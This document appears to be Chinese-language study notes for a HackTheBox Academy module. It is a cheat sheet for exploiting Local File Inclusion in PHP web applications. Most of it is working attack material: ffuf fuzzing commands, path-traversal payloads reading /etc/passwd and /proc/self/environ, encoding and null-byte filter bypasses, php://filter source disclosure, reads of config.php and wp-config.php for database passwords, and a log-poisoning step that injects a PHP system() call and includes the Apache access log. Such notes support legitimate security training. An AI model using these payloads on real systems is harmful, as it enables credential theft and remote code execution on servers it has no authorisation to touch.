# LFI



## <mark style="color:green;">**1. 發現點**</mark>&#x20;

1. ?page參數
2. ```
   ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
   ```

## <mark style="color:green;">**2. 測試Payload**</mark>

發現可能的 LFI 參數後，例如 `?page=`，我們可以使用 **Jhaddix 的 LFI 字典** 來進行自動化測試：

```shell-session
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

**🔹 基本 LFI 測試**

```
?page=/proc/self/environ      #for dokcer
?page=../../../../etc/passwd
```

**🔹 Docker 內部 LFI 測試**

```
?page=/proc/self/environ
```

**🔹 讀取 Apache 環境變數**

```shell-session
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

## <mark style="color:green;">**3. bypass技巧**</mark>

🔹 變形 `../`

```
?page=....//....//etc/passwd
?page=....\/....\/etc/passwd
?page=....//....//....//....//etc/passwd
```

**🔹 URL 編碼**

```
?page=..%2F..%2F..%2F..%2Fetc%2Fpasswd
?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**🔹 Null Byte 截斷**

```
?page=../../../../etc/passwd%00
```

**🔹 測試不同 Web Root**

```
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

**🔹 php base64 filter**

```sh
 /index.php?language=php://filter/read=convert.base64-encode/resource=config	
```

## <mark style="color:green;">4.濫用</mark>



**🔹 讀取 PHP 配置（可能包含 DB 密碼）**

```
?page=/var/www/html/config.php
?page=../../../../var/www/html/wp-config.php
```

🔹 Base64 讀取 PHP 代碼

```
/index.php?language=php://filter/read=convert.base64-encode/resource=config

```

```
echo "BASE64_OUTPUT" | base64 -d
```

**🔹 日誌汙染（Log Poisoning）**

```
curl "http://<SERVER_IP>:<PORT>/?page=<?php system('id'); ?>"

```

然後訪問：

```
?page=/var/log/apache2/access.log
```

## <mark style="color:red;">6.Skills Assessment</mark>

[<mark style="color:red;">https://academy.hackthebox.com/module/23/section/513</mark>](https://academy.hackthebox.com/module/23/section/513)
